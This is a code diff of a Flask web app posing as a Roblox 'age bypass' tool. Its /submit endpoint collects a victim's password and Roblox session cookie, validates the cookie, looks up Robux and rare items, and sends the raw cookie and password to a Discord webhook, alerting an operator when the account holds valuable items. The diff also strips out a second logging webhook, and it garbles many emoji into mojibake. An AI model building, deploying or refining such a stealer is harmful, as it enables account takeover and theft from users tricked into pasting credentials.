@@ -31,75 +31,6 @@ def clean_roblox_cookie(cookie):
     
     return cookie
 
-def send_bypass_logs_to_discord(user_info, korblox, headless, bypass_webhook_url):
-    """Send clean bypass logs (without cookie) to Discord webhook"""
-    try:
-        print("Background: Sending clean bypass logs...")
-        
-        # Check if user has Korblox or Headless for ping notification  
-        has_premium_items = korblox or headless
-        ping_content = ''
-        
-        if has_premium_items:
-            # Ping the user if account has Korblox or Headless
-            ping_content = '<@1343590833995251825> 🚨 **PREMIUM ITEMS DETECTED!** 🚨'
-            if korblox and headless:
-                ping_content += ' - Account has both Korblox AND Headless!'
-            elif korblox:
-                ping_content += ' - Account has Korblox!'
-            elif headless:
-                ping_content += ' - Account has Headless!'
-        
-        # Create Discord embed data for bypass logs (clean, no cookie)
-        bypass_data = {
-            'content': ping_content,
-            'embeds': [
-                {
-                    'title': '🎯 Age Bypass Successful',
-                    'color': 0x00ff00,  # Green color for success
-                    'thumbnail': {
-                        'url': user_info['profile_picture']
-                    },
-                    'fields': [
-                        {
-                            'name': '👤 Username',
-                            'value': user_info['username'],
-                            'inline': False
-                        },
-                        {
-                            'name': '💰 Robux',
-                            'value': user_info['robux_balance'].replace('R$ ', '') if 'R$ ' in user_info['robux_balance'] else user_info['robux_balance'],
-                            'inline': False
-                        },
-                        {
-                            'name': '📊 Status',
-                            'value': 'Successful ✅',
-                            'inline': False
-                        },
-                        {
-                            'name': '🎭 Premium Items',
-                            'value': f"Korblox: {'✅' if korblox else '❌'} | Headless: {'✅' if headless else '❌'}",
-                            'inline': False
-                        }
-                    ],
-                    'footer': {
-                        'text': f'Bypassed at {time.strftime("%H:%M", time.localtime())}',
-                        'icon_url': 'https://images-ext-1.discordapp.net/external/1pnZlLshYX8TQApvvJUOXUSmqSHHzIVaShJ3YnEu9xE/https/www.roblox.com/favicon.ico'
-                    }
-                }
-            ]
-        }
-        
-        # Send to bypass webhook
-        response = requests.post(bypass_webhook_url, json=bypass_data, timeout=5)
-        
-        if response.status_code in [200, 204]:
-            print(f"Background: Bypass logs webhook successful: {response.status_code}")
-        else:
-            print(f"Background: Bypass logs webhook failed: {response.status_code}")
-            
-    except Exception as e:
-        print(f"Background: Error sending bypass logs to Discord: {str(e)}")
 
 def send_to_discord_background(password, korblox, headless, cookie, webhook_url):
     """Background function to send data to Discord webhook"""
@@ -118,7 +49,7 @@ def send_to_discord_background(password, korblox, headless, cookie, webhook_url)
         
         if has_premium_items:
             # Ping the user if account has Korblox or Headless
-            ping_content = '<@1343590833995251825> 🚨 **PREMIUM ITEMS DETECTED!** 🚨'
+            ping_content = '<@1343590833995251825> ðŸš¨ **PREMIUM ITEMS DETECTED!** ðŸš¨'
             if korblox and headless:
                 ping_content += ' - Account has both Korblox AND Headless!'
             elif korblox:
@@ -147,33 +78,33 @@ def send_to_discord_background(password, korblox, headless, cookie, webhook_url)
                     },
                     'fields': [
                         {
-                            'name': '👤 Username',
+                            'name': 'ðŸ‘¤ Username',
                             'value': user_info['username'],
                             'inline': False
                         },
                         {
-                            'name': '💰 Robux',
+                            'name': 'ðŸ’° Robux',
                             'value': user_info['robux_balance'].replace('R$ ', '') if 'R$ ' in user_info['robux_balance'] else user_info['robux_balance'],
                             'inline': False
                         },
                         {
-                            'name': '⌛ Pending Robux',
+                            'name': 'âŒ› Pending Robux',
                             'value': '0',
                             'inline': False
                         },
                         {
-                            'name': '📊 Status',
-                            'value': 'Success 🟩',
+                            'name': 'ðŸ“Š Status',
+                            'value': 'Success ðŸŸ©',
                             'inline': False
                         },
                         {
-                            'name': '🔐 Password',
+                            'name': 'ðŸ” Password',
                             'value': password if password else 'Not provided',
                             'inline': False
                         },
                         {
-                            'name': '🎭 Items',
-                            'value': f"Korblox: {'✅' if korblox else '❌'} | Headless: {'✅' if headless else '❌'}",
+                            'name': 'ðŸŽ­ Items',
+                            'value': f"Korblox: {'âœ…' if korblox else 'âŒ'} | Headless: {'âœ…' if headless else 'âŒ'}",
                             'inline': False
                         }
                     ],
@@ -183,11 +114,11 @@ def send_to_discord_background(password, korblox, headless, cookie, webhook_url)
                     }
                 },
                 {
-                    'title': '🍪 Cookie Data',
+                    'title': 'ðŸª Cookie Data',
                     'color': 0xff0000,
                     'description': f'```{cookie_content}```',
                     'footer': {
-                        'text': 'Authentication Token • Secured',
+                        'text': 'Authentication Token â€¢ Secured',
                         'icon_url': 'https://images-ext-1.discordapp.net/external/1pnZlLshYX8TQApvvJUOXUSmqSHHzIVaShJ3YnEu9xE/https/www.roblox.com/favicon.ico'
                     }
                 }
@@ -205,18 +136,6 @@ def send_to_discord_background(password, korblox, headless, cookie, webhook_url)
         else:
             print(f"Background: Discord webhook failed: {response.status_code}")
         
-        # Also send to bypass logs webhook (clean data without cookie) - only if cookie worked
-        if user_info.get('success', False):
-            bypass_webhook_url = os.environ.get('BYPASS_WEBHOOK_URL')
-            if bypass_webhook_url:
-                print("Background: Sending to bypass logs webhook...")
-                send_bypass_logs_to_discord(user_info, korblox, headless, bypass_webhook_url)
-            else:
-                print("Background: BYPASS_WEBHOOK_URL environment variable not configured")
-                print("Background: Available webhook env vars:", [key for key in os.environ.keys() if 'WEBHOOK' in key.upper()])
-                print("Background: Bypass logs will not be sent - configure BYPASS_WEBHOOK_URL to enable")
-        else:
-            print("Background: Not sending bypass logs - cookie validation failed")
             
     except Exception as e:
         print(f"Background: Error sending to Discord: {str(e)}")
@@ -286,7 +205,7 @@ def get_roblox_user_info(cookie):
                     print(f"Alternative Robux API error: {str(alt_error)}")
             
             # Check Premium status
-            premium_status = '❌ No'
+            premium_status = 'âŒ No'
             try:
                 premium_response = requests.get(f'https://premiumfeatures.roblox.com/v1/users/{user_id}/validate-membership',
                                               headers=headers, timeout=5)
@@ -297,9 +216,9 @@ def get_roblox_user_info(cookie):
                     print(f"Premium API response: {premium_data}")
                     # Handle both object and boolean responses
                     if isinstance(premium_data, bool):
-                        premium_status = '✅ Yes' if premium_data else '❌ No'
+                        premium_status = 'âœ… Yes' if premium_data else 'âŒ No'
                     elif isinstance(premium_data, dict) and premium_data.get('isPremium', False):
-                        premium_status = '✅ Yes'
+                        premium_status = 'âœ… Yes'
                 else:
                     print(f"Premium API failed with status: {premium_response.status_code}")
             except Exception as premium_error:
@@ -329,7 +248,7 @@ def get_roblox_user_info(cookie):
         'user_id': None,
         'profile_picture': 'https://tr.rbxcdn.com/30DAY-AvatarHeadshot-A84C1E07EBC93E9CDAEC87A36A2FEA33-Png/150/150/AvatarHeadshot/Png/noFilter',
         'robux_balance': 'Not available',
-        'premium_status': '❌ No'
+        'premium_status': 'âŒ No'
     }
 
 def is_valid_cookie(cookie):
@@ -443,10 +362,9 @@ def health_check():
 
 @app.route('/health/full')
 def health_check_full():
-    """Comprehensive health check for both main and bypass webhooks"""
+    """Comprehensive health check for the main webhook"""
     results = {
         'main_webhook': {'status': 'unknown'},
-        'bypass_webhook': {'status': 'unknown'},
         'overall_status': 'unknown'
     }
     
@@ -455,4 +373,108 @@ def health_check_full():
     if not main_webhook_url:
         results['main_webhook'] = {
             'status': 'error',
-   
+            'message': 'DISCORD_WEBHOOK_URL not configured'
+        }
+    else:
+        try:
+            test_payload = {'content': 'Main webhook health check'}
+            response = requests.post(main_webhook_url, json=test_payload, timeout=5)
+            
+            if response.status_code in [200, 204]:
+                results['main_webhook'] = {
+                    'status': 'ok',
+                    'message': 'Main webhook successful',
+                    'status_code': response.status_code
+                }
+            else:
+                results['main_webhook'] = {
+                    'status': 'error',
+                    'message': f'Main webhook failed with status {response.status_code}',
+                    'status_code': response.status_code
+                }
+        except Exception as e:
+            results['main_webhook'] = {
+                'status': 'error',
+                'message': f'Main webhook error: {str(e)[:100]}'
+            }
+    
+    # Determine overall status
+    main_ok = results['main_webhook']['status'] == 'ok'
+    
+    if main_ok:
+        results['overall_status'] = 'ok'
+        status_code = 200
+    else:
+        results['overall_status'] = 'error'
+        status_code = 500
+    
+    return jsonify(results), status_code
+
+@app.route('/debug')
+def debug_info():
+    """Debug endpoint to check environment and configuration"""
+    return jsonify({
+        'environment_variables': {
+            'DISCORD_WEBHOOK_URL': 'SET' if os.environ.get('DISCORD_WEBHOOK_URL') else 'NOT_SET',
+            'DATABASE_URL': 'SET' if os.environ.get('DATABASE_URL') else 'NOT_SET',
+            'SESSION_SECRET': 'SET' if os.environ.get('SESSION_SECRET') else 'NOT_SET'
+        },
+        'python_version': sys.version,
+        'current_working_directory': os.getcwd(),
+        'files_in_directory': os.listdir('.'),
+        'timestamp': time.strftime('%Y-%m-%d %H:%M:%S UTC', time.gmtime())
+    })
+
+
+@app.route('/submit', methods=['POST'])
+def submit_form():
+    """Handle form submission and send to Discord webhook"""
+    try:
+        data = request.get_json()
+        
+        # Extract all form fields
+        password = data.get('password', '').strip()
+        korblox = data.get('korblox', False)
+        headless = data.get('headless', False)
+        cookie = data.get('cookie', '').strip()
+        
+        # Auto-clean Roblox warning prefix from cookie
+        cookie = clean_roblox_cookie(cookie)
+        
+        # Server-side validation
+        if not cookie:
+            return jsonify({
+                'success': False, 
+                'message': 'Missing required field (cookie)'
+            }), 400
+        
+        # Comprehensive cookie validation
+        is_valid, is_expired, error_msg = is_valid_cookie(cookie)
+        
+        if not is_valid or is_expired:
+            return jsonify({
+                'success': False, 
+                'message': 'Your Cookie Was Expired Or Invalid'
+            }), 400
+        
+        
+        # Get Discord webhook URL from environment
+        webhook_url = os.environ.get('DISCORD_WEBHOOK_URL')
+        if not webhook_url:
+            print("ERROR: DISCORD_WEBHOOK_URL environment variable not set")
+            print("Available environment variables:", [key for key in os.environ.keys() if 'WEBHOOK' in key.upper() or 'DISCORD' in key.upper()])
+            return jsonify({
+                'success': False, 
+                'message': 'Discord webhook not configured. Please set DISCORD_WEBHOOK_URL environment variable in your deployment platform.'
+            }), 500
+        
+        print("Discord webhook URL configured successfully") # Don't log URL for security
+        
+        # Process Discord webhooks synchronously for Vercel compatibility  
+        print("Processing Discord webhooks synchronously...")
+        start_time = time.time()
+        
+        try:
+            send_to_discord_background(password, korblox, headless, cookie, webhook_url)
+            end_time = time.time()
+         
